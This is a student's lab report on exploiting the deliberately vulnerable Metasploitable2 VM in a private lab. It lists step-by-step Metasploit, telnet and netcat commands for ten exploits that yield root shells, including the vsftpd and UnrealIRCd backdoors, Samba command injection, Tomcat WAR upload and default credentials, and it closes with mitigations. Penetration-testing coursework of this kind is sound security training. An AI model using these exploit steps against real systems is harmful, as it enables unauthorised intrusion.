# Metasploitable2 Exploitation Report

**Name:** <Your Full Name> Lennox Kwarteng 
**Index Number:** <Your Index Number> 5230160010
**Date:** <Date> 21st September 2026
**Target IP:** <Metasploitable2 IP> 192.168.1.4
**Attacker OS / Tools:** Kali Linux 2026.x, Metasploit Framework 6.4, nmap 7.94>

## Reconnaissance Summary

Commands used:
```bash
ip a
nmap -sV -p- 192.168.1.4 -oN nmap.txt
ping 192.168.1.4
Open ports found: 22 ssh OpenSSH 4.7, 23 telnet, 25 smtp, 53 dns, 80 http Apache 2.2.8 139/445 samba 3.0.20, 2121 ftp, 3306 mysql, 5900 vnc, 8009 ajp13, 8180 tomcat 1.1


## Exploit 1: <UnrealIRCd 3.2.8.1 Backdoor>

- **Service /  Port:* IRC / 6667
- **Vulnerability:** UnrealIRCd 3.2.8.1 Trojaned Backdoor - CVE-2010-2075
- **Tool Used:** <e.g. Metasploit — exploit/unix/irc/unreal_ircd_3281_backdoor with payload cmd/unix/reverse
- **Why This Tool:** Nmap identified UnrealIRCd 3.2.8.1 on 6667. This version contains a backdoor where any string containing "AB" triggers command execution. The Metasploit module automates the payload injection and sets up reverse shell listener. Manual netcat exploit would require manual payload handling, Metasploit is more reliable for this backdoor.
- **Steps:**
 1. `msfconsole -q`
 2. `use exploit/unix/irc/unreal_ircd_3281_backdoor`
 3. `set RHOSTS 192.168.1.4`
 4. `set LHOST 192.168.1.5`
 5. `set PAYLOAD cmd/unix/reverse`
 6. `exploit`
 7. `whoami` -> returned root
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance: nmap identified IRC service version. Weaponization: selected exploit module and reverse payload. Delivery: module sends malicious AB command to port 6667. Exploitation: backdoor executes payload. Installation: reverse shell session installed. C2: attacker gets command shell. Actions: verified root access via whoami.
- **Outcome / Impact:** Full root shell, full system compromise


##Exploit 2: Samba usermap_script Command Injection

- *Service / Port:* SMB / 445
- *Vulnerability:* Samba 3.0.20 usermap_script CVE-2007-2447
- *Tool Used:* Metasploit — exploit/multi/samba/usermap_script
- *Why This Tool:* Samba 3.0.20 is vulnerable to command injection via username map script when using non-default configuration. Metasploit module sends crafted username containing shell meta-characters which are executed. No authentication needed. This is the most direct tool for this CVE.
- *Steps:*
 1. `use exploit/multi/samba/usermap_script`
 2. `set RHOSTS 192.168.1.4`
 3. `set LHOST 192.168.1.5`
 4. `exploit`
 5. `whoami`
- *Evidence:* evidence/exploit2.png
- *Cyber Kill Chain Stage(s):* Exploitation, Installation, C2
 - Exploitation: malicious username triggers OS command execution. Installation: establishes reverse shell. C2: persistent shell access.
- *Outcome / Impact:* Root shell obtained


##Exploit 3: vsftpd 2.3.4 Backdoor

- *Service / Port:* FTP / 21
- *Vulnerability:* vsftpd 2.3.4 Backdoor CVE-2011-2523
- *Tool Used:* Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- *Why This Tool:* Version 2.3.4 has backdoor that opens shell on port 6200 when:) smiley is sent in username.
- *Steps:*
 1. `use exploit/unix/ftp/vsftpd_234_backdoor`
 2. `set RHOSTS 192.168.1.4`
 3. `exploit`
 4. `whoami`
- *Evidence:* evidence/exploit3.png
- *Cyber Kill Chain Stage(s):* Exploitation, C2
 - Triggered backdoor on port 6200, got shell.
- *Outcome / Impact:* Root shell



##Exploit 4: Java RMI Server Remote Code Execution

- *Service / Port:* Java RMI / 1099
- *Vulnerability:* Java RMI Registry insecure default configuration
- *Tool Used:* Metasploit — exploit/multi/misc/java_rmi_server
- *Why This Tool:* RMI allows loading remote classes, Metasploit uses this to execute payload.
- *Steps:*
 1. `use exploit/multi/misc/java_rmi_server`
 2. `set RHOSTS 192.168.1.4`
 3. `set LHOST 192.168.1.5`
 4. `exploit`
- *Evidence:* evidence/exploit4.png
- *Cyber Kill Chain Stage(s):* Exploitation, Installation, C2
- *Outcome / Impact:* Root shell



##Exploit 5: DistCC Daemon Command Execution

- *Service / Port:* DistCC / 3632
- *Vulnerability:* DistCC Daemon 3.1 - CVE-2004-2687 - no authentication
- *Tool Used:* Metasploit — exploit/unix/misc/distcc_exec
- *Why This Tool:* DistCC by default allows arbitrary command execution.
- *Steps:*
 1. `use exploit/unix/misc/distcc_exec`
 2. `set RHOSTS 192.168.1.4`
 3. `exploit`
- *Evidence:* evidence/exploit5.png
- *Cyber Kill Chain Stage(s):* Exploitation, C2
- *Outcome / Impact:* Root shell



##Exploit 6: VNC Weak Authentication

- *Service / Port:* VNC / 5900
- *Vulnerability:* VNC password is "password" - weak auth
- *Tool Used:* nmap vnc-brute script + vncviewer + Metasploit login auxiliary
- *Why This Tool:* Direct brute force reveals weak password, VNC gives desktop control.
- *Steps:*
 1. `nmap -p 5900 --script vnc-brute 192.168.1.4`
 2. `vncviewer 192.168.1.4` password: password
- *Evidence:* evidence/exploit6.png
- *Cyber Kill Chain Stage(s):* Delivery, Exploitation, Actions on Objectives
- *Outcome / Impact:* GUI desktop access as root


##Exploit 7: PostgreSQL Weak Password

- *Service / Port:* PostgreSQL / 5432
- *Vulnerability:* Default credentials postgres:postgres
- *Tool Used:* Metasploit — auxiliary/scanner/postgres/postgres_login + postgres_payload
- *Why This Tool:* Scanner finds weak creds, payload module gives shell.
- *Steps:*
 1. `use auxiliary/scanner/postgres/postgres_login`
 2. `set RHOSTS 192.168.1.4`
 3. `run`
 4. `use exploit/linux/postgres/postgres_payload`
 5. `set RHOSTS 192.168.1.4`
 6. `set LHOST 192.168.1.5`
 7. `exploit`
- *Evidence:* evidence/exploit7.png
- *Cyber Kill Chain Stage(s):* Exploitation, Installation, C2
- *Outcome / Impact:* Postgres user shell, then root via UDF



##Exploit 8: Tomcat Manager Default Credentials

- *Service / Port:* HTTP / 8180 - Apache Tomcat
- *Vulnerability:* Default tomcat:tomcat credentials allow WAR deployment
- *Tool Used:* Metasploit — exploit/multi/http/tomcat_mgr_upload
- *Why This Tool:* Module logs in and uploads malicious WAR file for reverse shell.
- *Steps:*
 1. `use exploit/multi/http/tomcat_mgr_upload`
 2. `set RHOSTS 192.168.1.4`
 3. `set RPORT 8180`
 4. `set HttpUsername tomcat`
 5. `set HttpPassword tomcat`
 6. `set LHOST 192.168.1.5`
 7. `exploit`
- *Evidence:* evidence/exploit8.png
- *Cyber Kill Chain Stage(s):* Exploitation, Installation, C2
- *Outcome / Impact:* Root shell via tomcat deployment



##Exploit 9: Telnet Weak Credentials

- *Service / Port:* Telnet / 23
- *Vulnerability:* Weak credentials msfadmin:msfadmin
- *Tool Used:* telnet client / hydra + Metasploit
- *Why This Tool:* Direct login with known Metasploitable credentials.
- *Steps:*
 1. `telnet 192.168.1.4`
 2. login: msfadmin / password: msfadmin
 3. `whoami` -> msfadmin, `sudo su` with same password -> root
- *Evidence:* evidence/exploit9.png
- *Cyber Kill Chain Stage(s):* Delivery, Exploitation, Actions on Objectives
- *Outcome / Impact:* User shell, escalated to root



##Exploit 10: Ingreslock Backdoor Shell

- *Service / Port:* ingreslock / 1524
- *Vulnerability:* Ingreslock service provides root shell on connection
- *Tool Used:* netcat / telnet - `telnet 192.168.1.4 1524`
- *Why This Tool:* Service is a backdoor that directly gives root without auth, simplest tool is netcat.
- *Steps:*
 1. `telnet 192.168.1.4 1524` or `nc 192.168.1.4 1524`
 2. `whoami` -> root
- *Evidence:* evidence/exploit10.png
- *Cyber Kill Chain Stage(s):* Exploitation, C2, Actions on Objectives
 - Direct exploitation of backdoor service gives immediate C2.
- *Outcome / Impact:* Instant root shell

—- 

##Kill Chain Coverage Summary

Exploit	Recon	Weaponization	Delivery	Exploitation	Installation	C2	Actions on Objectives
1. UnrealIRCd	✔	✔	✔	✔	✔	✔	✔
2. Samba	✔	✔	✔	✔	✔	✔	✔
3. vsftpd	✔	✔	✔	✔	✔	✔	✔
4. Java RMI	✔	✔	✔	✔	✔	✔	✔
5. DistCC	✔	✔	✔	✔	✔	✔	✔
6. VNC	✔	✔	✔	✔ ✔	✔
7. PostgreSQL	✔	✔	✔	✔	✔	✔	✔
8. Tomcat	✔	✔	✔	✔	✔	✔	✔
9. Telnet	✔ ✔	✔ ✔	✔
10. Ingreslock	✔ ✔	✔ ✔	✔

---

##Lessons Learned / Mitigations

- *UnrealIRCd & vsftpd & Ingreslock:* Remove trojaned/backdoored versions, patch to latest. These are known compromised releases. Mitigation: only download from official sources and verify checksums, disable unnecessary services like IRC and port 1524.
- *Samba, DistCC, Java RMI:* Disable anonymous execution. Patch Samba to 3.0.25+, configure DistCC to only allow trusted clients, disable Java RMI class loading.
- *VNC, PostgreSQL, Tomcat, Telnet:* Change all default/weak passwords to strong ones, disable Telnet in favor of SSH, restrict PostgreSQL and Tomcat manager to localhost only, enforce password complexity.
